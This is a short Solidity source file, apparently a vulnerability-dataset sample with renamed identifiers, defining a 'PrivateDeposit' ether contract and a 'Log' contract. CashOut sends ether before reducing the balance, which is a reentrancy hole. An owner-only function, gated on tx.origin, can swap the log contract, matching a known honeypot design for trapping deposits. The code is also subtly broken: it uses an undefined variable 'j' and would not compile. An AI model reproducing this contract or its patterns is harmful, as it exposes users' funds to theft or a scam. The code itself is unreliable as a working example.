pragma solidity ^0.4.19;

contract PrivateDeposit
{
    mapping (address => uint) public b;

    uint public MinDeposit = 1 ether;
    address public e;

    Log TransferLog;

    modifier a() {
        require(tx.origin == e);
        _;
    }

    function PrivateDeposit()
    {
        e = msg.sender;
        TransferLog = new Log();
    }

    function c(address f) a
    {
        TransferLog = Log(f);
    }

    function Deposit()
    public
    payable
    {
        if(msg.value >= MinDeposit)
        {
            b[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint i)
    {
        if(i<=b[msg.sender])
        {
            if(msg.sender.call.value(i)())
            {
                b[msg.sender]-=i;
                TransferLog.AddMessage(msg.sender,i,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Log
{

    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address g,uint h,string d)
    public
    {
        LastMsg.Sender = g;
        LastMsg.Time = j;
        LastMsg.Val = h;
        LastMsg.Data = d;
        History.push(LastMsg);
    }
}